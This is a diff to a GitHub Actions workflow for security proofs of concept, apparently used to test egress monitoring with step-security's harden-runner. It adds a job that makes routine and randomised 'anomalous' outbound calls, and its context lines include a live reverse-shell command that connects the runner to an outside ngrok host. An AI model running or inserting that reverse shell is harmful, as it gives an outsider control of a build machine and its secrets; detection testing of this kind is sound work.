@@ -1,6 +1,12 @@
 name: Workflow for POCs
 on:
   workflow_dispatch:
+    inputs:
+      enable_anomalous_call:
+        description: 'Make anomalous outbound call'
+        required: false
+        default: false
+        type: boolean
 
 jobs:
   tj-actions-simulation:
@@ -108,3 +114,35 @@ jobs:
 
     - run: |
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1" 
+  anomalous-outbound-call:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: step-security/harden-runner@rc
+      with:
+         egress-policy: audit
+         
+    - name: Checkout code
+      uses: actions/checkout@v3
+            
+    - name: Run outbound calls from host
+      run: |
+        start_time=$(date +%s)
+        end_time=$((start_time + 30))
+        
+        while [ $(date +%s) -lt $end_time ]; do
+          curl -I https://www.google.com
+          curl -I https://goreleaser.com
+          sleep 10  # wait 10 seconds between calls
+        done
+    
+    - name: Make anomalous outbound call
+      if: ${{ github.event.inputs.enable_anomalous_call == 'true' }}
+      run: |
+        # Generate a random subdomain
+        RANDOM_SUBDOMAIN=$(openssl rand -hex 8)
+        ANOMALOUS_DOMAIN="${RANDOM_SUBDOMAIN}.example.com"
+        
+        echo "Making anomalous call to: $ANOMALOUS_DOMAIN"
+        
+        # Attempt to connect to the random domain (this will likely fail)
+        curl -I --max-time 5 "https://$ANOMALOUS_DOMAIN" || true
